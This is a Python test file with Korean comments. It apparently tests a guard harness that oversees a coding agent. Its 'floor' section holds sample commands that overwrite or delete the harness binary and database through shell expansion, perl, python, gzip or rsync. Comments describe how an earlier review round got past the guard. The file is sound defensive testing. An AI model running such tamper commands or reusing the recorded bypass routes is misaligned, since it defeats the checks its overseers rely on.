ck("두 번 불러도 한 행", _n == 1, _n)
ck("두 번째도 같은 값을 돌려준다", first == again, (first, again))
ck("유령이 아니라 진짜 집계다", first and first.get("blocks", 0) >= 1, first)

# 4회차 C③: `loop adopt` 는 `close_loop` 을 직접 불러 스냅샷 없이 회차를 버렸다 —
# 마찰이 쌓인 회차를 지우는 가장 싼 방법이었다. `close_loop` 이 남기게 했다.
ck("close_loop 이 cfg 를 요구한다 (빠뜨릴 자리를 없앤다)",
   "cfg" in inspect.signature(h.close_loop).parameters)
ck("close_loop 이 스냅샷을 남긴다",
   "record_cycle_close" in inspect.getsource(h.close_loop))

# --- 삭제는 결손으로 보여야 한다 ---------------------------------------------
# 요약의 `쓰기 규칙 n/m` 은 분모가 **설정 자신**이라 규칙을 지우면 7/7 → 6/6 이
# 된다 — 삭제가 결코 결손으로 나타나지 않았다(4회차 E-F12). 개수로는 못 잡는
# 종류라 **이름을 템플릿과 대조**한다.
print("== 기본 규칙을 지우면 드리프트로 보인다")
_tpl = h.jload(os.path.join(REPO, "plugins/step-seven-harness/templates/stages.json"))
_cut = h.Cfg(dict(cfg))
_cut["write_rules"] = [r for r in cfg["write_rules"]
                       if r["id"] not in ("docs_readonly", "loop_prefix")]
_d = h.drift_problems(_cut, root)
ck("빠진 규칙 이름을 말한다",
   any("docs_readonly" in x and "loop_prefix" in x for x in _d), _d)
ck("정상 설정에서는 조용하다",
   not [x for x in h.drift_problems(cfg, root) if "쓰기 규칙" in x])
_sw = h.Cfg(dict(cfg))
_st = list(cfg["stages"]); _st[1], _st[2] = _st[2], _st[1]
_sw["stages"] = _st
ck("단계 순서를 바꾸면 말한다",
   any("단계 순서" in x for x in h.drift_problems(_sw, root)))

# --- 사본은 원본과 같다 -----------------------------------------------------
# `.py` 만 보던 시절 두 구멍이 있었다(4회차 D-M9): `gates/zzz.pyc` 를 심으면
# `pkgutil` 이 발견해 임포트하는데 복사·정리 어느 쪽에도 안 걸렸고, 플러그인
# 업그레이드로 게이트 파일이 없어져도 사본에는 영원히 남았다.
print("== 엔진 사본은 원본과 같다")
ck("임포트 가능한 확장자를 전부 본다",
   set(h.IMPORTABLE) >= {".py", ".pyc", ".so"}, h.IMPORTABLE)
_cp = _tf.mkdtemp()
os.makedirs(os.path.join(_cp, "gates"))
for _f in ("harness.py", "gates/__init__.py", "gates/zzz.pyc", "gates/old.py"):
    open(os.path.join(_cp, _f), "w").write("x\n")
_found = set(h._importable(_cp))
ck("사본 안의 .pyc 를 찾는다", os.path.join("gates", "zzz.pyc") in _found, _found)
h._purge_engine_copy(_cp)
ck("정리하면 .pyc 도 사라진다", not h._importable(_cp), h._importable(_cp))

# --- 게이트 하나가 깨져도 나머지는 실린다 -------------------------------------
# 첫 예외에서 루프가 중단돼 `criteria.py` 하나가 알파벳 뒤 셋을 끌고 갔다.
print("== 게이트 하나가 깨져도 나머지는 실린다")
ck("적재 실패를 목록으로 돌려준다",
   isinstance(h.GATE_LOAD_FAILS, list), type(h.GATE_LOAD_FAILS))
ck("정상 설치에서는 비어 있다", not h.GATE_LOAD_FAILS, h.GATE_LOAD_FAILS)
ck("원인을 읽는 곳이 있다", h.gate_load_why() == "")
h.GATE_LOAD_FAILS.append(("criteria", "SyntaxError: 실험"))
try:
    ck("원인이 메시지에 실린다",
       "criteria" in h.gate_load_why() and "실험" in h.gate_load_why(),
       h.gate_load_why())
finally:
    h.GATE_LOAD_FAILS.pop()

# --- 원문 바닥값 감시 -----------------------------------------------------
# 4회차가 바닥값을 **세 방향**에서 뚫었고 전부 실행까지 재현됐다. 셋 다 토큰으로는
# 경로가 아니지만 문자열에는 그대로 들어 있었다. 확장을 하나씩 구현하는 대신
# 원문을 보고 **묻는다**. 여기서 양방향을 못 박는다.
print("== 원문에 바닥값이 보이면 묻는다 (셸을 재구현하지 않는다)")
for cmd in ('cp evil "$(pwd)/.claude/harness/bin/harness"',
            "cp evil `pwd`/.claude/harness/bin/harness",
            "cp evil $PWD/.claude/harness/bin/harness",
            "cp evil $'.claude/harness/bin/harness'",
            'python3 -c "open(\'.claude/harness/harness.db\',\'w\')"',
            "perl -e \"unlink q(.claude/harness/harness.db)\"",
            "rsync evil .claude/harness/bin/harness",
            "gzip .claude/harness/harness.db",
            "D=.claude/harness/bin; cp evil $D/harness"):
    ck("  잡는다: %s" % cmd[:44], h.floor_named(cfg, cmd))

# **실행은 언급이 아니다.** 여기가 과잉 차단이 되면 마찰이고, 마찰은 게이트를 끈다.
for cmd in (".claude/harness/bin/harness status",
            "python3 .claude/harness/bin/harness.py status",
            "sh -c '.claude/harness/bin/harness advance'",
            "git add -A", "npm test", "make build", "docker build -t x .",
            "curl -sL https://example.com/x.tgz > /tmp/x.tgz",
            "grep -rn foo src/", "ls .claude/harness",
            # 읽기는 막지 않는다 (기존 설계). **엔진 기본값만** 면제된다.
            "cat .claude/harness/harness.db",
            "grep -rn x .claude/harness/bin/harness"):
    ck("  지나간다: %s" % cmd[:44], not h.floor_named(cfg, cmd), h.floor_named(cfg, cmd))

# 면제는 **하네스 실행 파일에만**. 처음에 "인터프리터의 다음 토큰" 으로 넓게
# 뒀다가 `interpreters: [gzip]` + `gzip <DB>` 로 뚫렸다 — 4회차가 지적한
# `skip=2` 구멍을 그대로 다시 만든 것이었다.
_wide = h.Cfg(dict(cfg))
_wide["bash"] = dict(cfg["bash"], interpreters=list(cfg["bash"]["interpreters"]) + ["gzip"],
                     readers=list(cfg["bash"]["readers"]) + ["rsync"])
ck("설정으로 readers 를 늘려도 원문 감시는 남는다",
   h.floor_named(_wide, "rsync evil .claude/harness/bin/harness"))
ck("설정으로 interpreters 를 늘려도 남는다",
   h.floor_named(_wide, "gzip .claude/harness/harness.db"))
# 면제는 **엔진 기본값** 이름에만. 설정으로 넓히는 길이 있으면 B#1 이 되살아난다.
ck("readers 설정은 원문 감시 면제를 넓히지 못한다",
   h.floor_named(_wide, "rsync .claude/harness/harness.db /tmp/x"))
ck("리다이렉트가 붙으면 읽기가 아니다",
   h.floor_named(cfg, "cat /tmp/evil > .claude/harness/bin/harness"))

# **바닥값 판정은 하나다.** 원문 감시를 경로 분석 옆에 따로 두면 같은 질문에
# 판정기가 둘이고, 하나만 게이트의 `entry` 에 들어가 나머지가 자기증명 밖에
# 남는다 — ①에서 고친 모양을 그대로 다시 만드는 것이다.
ck("경로를 특정하면 deny", h.floor_verdict(cfg, root, "rm " + h.ENGINE_REL)[0] == "deny")
ck("원문에만 보이면 ask",
   h.floor_verdict(cfg, root, 'cp evil "$(pwd)/.claude/harness/bin/harness"')[0] == "ask")
ck("아무것도 아니면 판정 없음",
   h.floor_verdict(cfg, root, "git add -A")[0] is None)
_src = inspect.getsource(h)
_calls = (_src.count("floor_verdict(cfg, root, cmd)")
          - _src.count("def floor_verdict(cfg, root, cmd)"))
ck("훅은 바닥값을 한 곳에서만 묻는다", _calls == 1, _calls)
ck("옆에 남은 판정기가 없다",
   _src.count("floor_named(cfg, cmd)") - _src.count("def floor_named(cfg, cmd)") == 1)

# --- 자기증명 규칙 자체 ---------------------------------------------------
# 4회차: 이 강제 장치에 테스트가 없어서, `wants != {True, False}` 를 `if False:`
# 로 바꿔도 41종 검사가 전부 초록이었다. 그리고 그 규칙은 애초에 공허했다 —
# 진입점을 통째로 비운 네 게이트가 42/42 를 유지했다. 둘 다 여기서 못 박는다.
print("== 자기증명 규칙이 자기를 증명한다")
ck("게이트가 전부 진입점을 밝힌다",
   all(g.entry for g in h.GATES),
   str([g.key for g in h.GATES if not g.entry]))
ck("진입점 이름이 실재하는 함수다",
   all(callable(getattr(h, nm, None)) for g in h.GATES for nm in g.entry),
   str([nm for g in h.GATES for nm in g.entry if not callable(getattr(h, nm, None))]))


class _Hollow(h.Gate):
    """엔진을 한 번도 부르지 않는 게이트. **탐지되어야 한다.**"""
    key = "__hollow__"
    entry = ("check_write",)

    @property
    def name(self):
        return "공허"

    def state(self, cfg):
        return 1, 1

    def probes(self, ctx):
        return [("공허: 막는다", lambda: (True, "막았다"), True),
                ("공허: 통과시킨다", lambda: (False, ""), False)]


h.GATES.append(_Hollow())
try:
    rows = h.gate_probes(h.Ctx(con, cfg, root, h.head_loop(con),
                               h.active_stage(con, h.head_loop(con))))
    bad = [r for r in rows if r[0].startswith("공허")]
    ck("진입점을 지나지 않는 탐침은 실패한다",
       bad and all(not ok for _d, ok, _w in bad), str(bad))
    ck("  왜 실패했는지 말한다",
       bad and all("진입점" in w for _d, _ok, w in bad), str(bad))
finally:
    h.GATES[:] = [g for g in h.GATES if g.key != "__hollow__"]

# 탐침은 부수 효과를 남기지 않는다 — 사본에 대고 묻기 때문이다.
_before = con.execute("SELECT COUNT(*) c FROM event").fetchone()["c"]
h.gate_probes(h.Ctx(con, cfg, root, h.head_loop(con),
                    h.active_stage(con, h.head_loop(con))))
ck("탐침이 이벤트를 남기지 않는다",
   con.execute("SELECT COUNT(*) c FROM event").fetchone()["c"] == _before)
# 훅 채널은 JSON 이다. 탐침이 `emit` 을 가로챘다가 **되돌려 놓지 않으면**
# 그 뒤의 진짜 판정이 사라진다 — fail-open 이라 조용히.
_emit_before = h.emit
h.gate_probes(h.Ctx(con, cfg, root, h.head_loop(con),
                    h.active_stage(con, h.head_loop(con))))
ck("탐침이 emit 을 되돌려 놓는다", h.emit is _emit_before)


try:
    with h.probe_run(sys.modules[h.__name__], ("check_write",)):
        raise RuntimeError("중단")
except RuntimeError:
    pass
ck("탐침이 터져도 emit 이 되돌아온다", h.emit is _emit_before)

# --- 서브명령 표 ---------------------------------------------------------
# 표로 옮기기 전에는 `harness loop inetnt "작업 내용"` 이 rc=0 으로 조용히
# `show` 를 했다 — 사용자는 기록됐다고 믿는다. 표가 모르는 이름을 알아본다.
print("== 서브명령은 표에서 찾는다 (모르는 이름은 조용히 떨어지지 않는다)")
for name, table in (("loop", h.LOOP_SUBS), ("auto-skip", h.AUTO_SKIP_SUBS)):
    ck("%s 표가 비어 있지 않다" % name, bool(table), str(sorted(table)))
    try:
        h.dispatch(table, name, "no-such-sub")
        ck("%s 는 모르는 서브명령을 거절한다" % name, False, "거절하지 않았다")
    except h.Refuse as exc:
        ck("%s 는 모르는 서브명령을 거절한다" % name, exc.code == 2)
        ck("  가능한 이름을 알려준다",
           all(k in " ".join(exc.lines) for k in table))

# `CTRL_SUB2` 는 **동의가 필요한** loop 서브명령이다. 이름이 표와 어긋나면
# 그 서브명령에 동의 게이트가 조용히 안 걸린다 — 게이트 제거다.
ck("동의 대상 loop 서브명령이 전부 표에 있다",
   set(h.CTRL_SUB2.get("loop", ())) <= set(h.LOOP_SUBS),
   str(set(h.CTRL_SUB2.get("loop", ())) - set(h.LOOP_SUBS)))

# Refuse 는 값이 아니라 예외다 — 호출자가 버릴 수 없다는 것이 존재 이유다.
ck("Refuse 는 Exception 이다", issubclass(h.Refuse, Exception))
ck("Refuse 는 빈 줄을 버린다", h.Refuse("a", "", "b").lines == ["a", "b"])
ck("Refuse 는 기본 종료 코드 2", h.Refuse("a").code == 2)
ck("Refuse 는 코드를 받는다", h.Refuse("a", code=1).code == 1)
try:
    h.Refuse("a", cod=1)
    ck("Refuse 는 오타 키워드를 삼키지 않는다", False, "삼켰다")
except TypeError:
    ck("Refuse 는 오타 키워드를 삼키지 않는다", True)

print("\n실패 %d개: %s" % (len(FAILS), FAILS or "없음"))
con.close()
cleanup(root)
sys.exit(1 if FAILS else 0)
